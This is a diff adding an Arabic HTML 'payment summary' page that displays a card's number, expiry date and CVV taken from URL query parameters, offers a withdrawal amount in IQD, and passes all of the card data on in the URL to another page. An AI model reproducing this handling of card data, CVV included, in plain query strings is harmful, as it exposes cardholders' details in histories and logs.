@@ -1,0 +1,182 @@
+<!doctype html><html lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ملخص الدفع</title><style>body {
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            direction: rtl;
+            flex-direction: column;
+            opacity: 0;
+            animation: fadeIn 1s ease-in-out forwards;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .card-container {
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 8px;
+            width: 100%;
+            max-width: 400px;
+            margin-bottom: 10px;
+            opacity: 0;
+            animation: fadeIn 1s ease-in-out forwards;
+            animation-delay: 0s;
+        }
+		    @media (max-width: 600px) {
+        h1 {
+            font-size: 1.5em;
+        }
+        p {
+            font-size: 1em;
+        }
+        .end-button {
+            padding: 8px 16px;
+            font-size: 0.9em;
+        }
+    }
+
+    @media (max-width: 400px) {
+        h1 {
+            font-size: 1.2em;
+        }
+        p {
+            font-size: 0.9em;
+        }
+        .end-button {
+            padding: 6px 12px;
+            font-size: 0.8em;
+        }
+    }
+
+        .card {
+            background: linear-gradient(135deg, #f7c6c7 0%, #f7b7a3 100%);
+            border-radius: 10px;
+            padding: 10px 13px;
+            color: #fff;
+            font-size: 1em;
+            position: relative;
+            text-align: left;
+            height: 100px;
+        }
+
+        .card img {
+            max-width: 100px;
+            position: absolute;
+            top: 15px;
+            left: 15px;
+        }
+
+        .card-info {
+            margin-top: 10px;
+            text-align: right;
+        }
+
+        .card-info div {
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .card-info div span {
+            direction: ltr;
+            text-align: left;
+            margin-left: 3px;
+        }
+
+        .amount-section {
+            margin-top: 20px;
+            text-align: center;
+            opacity: 0;
+            animation: fadeIn 1s ease-in-out forwards;
+            animation-delay: 0s;
+        }
+
+        .amount-section label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 1.2em;
+        }
+
+        .amount-section select {
+            padding: 10px;
+            font-size: 1em;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            width: 100%;
+            max-width: 200px;
+            margin-left: auto;
+            margin-right: auto;
+            display: block;
+            text-align: right;
+            direction: rtl;
+        }
+
+        h1 {
+            font-size: 1.5em;
+            margin-bottom: 20px;
+        }
+
+        .total-amount {
+            font-size: 1.2em;
+            color: #007bff;
+            margin-bottom: 30px;
+            text-align: center;
+            margin-left: auto;
+            margin-right: auto;
+            width: fit-content;
+        }
+
+        .total-amount span {
+            font-size: 1.2em;
+            display: inline-block;
+        }
+
+        .currency {
+            margin-left: 3px;
+            font-size: 1.2em;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 1em;
+            color: #fff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            opacity: 0;
+            animation: fadeIn 1s ease-in-out forwards;
+            animation-delay: 0s;
+        }</style><script defer="defer" src="bundle.js"></script></head><body><div class="card-container"><div class="card"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1200px-Mastercard-logo.svg.png" alt="MasterCard Logo"><div class="card-info"><div>رقم البطاقة: <span id="display-card-number"></span></div><div>تاريخ الانتهاء: <span id="display-expiry-date"></span></div><div>CVV: <span id="display-cvv"></span></div></div></div></div><div class="amount-section"><h1>المبلغ الكلي:</h1><div class="total-amount"><span class="currency">IQD</span> <span>400</span></div><label for="amount">اختيار المبلغ المراد سحبه:</label> <select id="amount"><option value="100">100 IQD</option><option value="200">200 IQD</option><option value="300">300 IQD</option><option value="400">400 IQD</option></select></div><button type="button" onclick="submitAmount()">تأكيد</button><script>function getQueryParam(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        document.getElementById('display-card-number').textContent = formatCardNumber(getQueryParam('card-number'));
+        document.getElementById('display-expiry-date').textContent = getQueryParam('expiry-date');
+        document.getElementById('display-cvv').textContent = getQueryParam('cvv');
+
+        function formatCardNumber(number) {
+            return number.replace(/(.{4})/g, '$1 ').trim();
+        }
+
+        function submitAmount() {
+            const selectedAmount = document.getElementById('amount').value;
+            const cardNumber = getQueryParam('card-number');
+            const expiryDate = getQueryParam('expiry-date');
+            const cvv = getQueryParam('cvv');
+            window.location.href = `new-page.html?card-number=${cardNumber}&expiry-date=${expiryDate}&cvv=${cvv}&amount=${selectedAmount}`;
+        }</script></body></html>
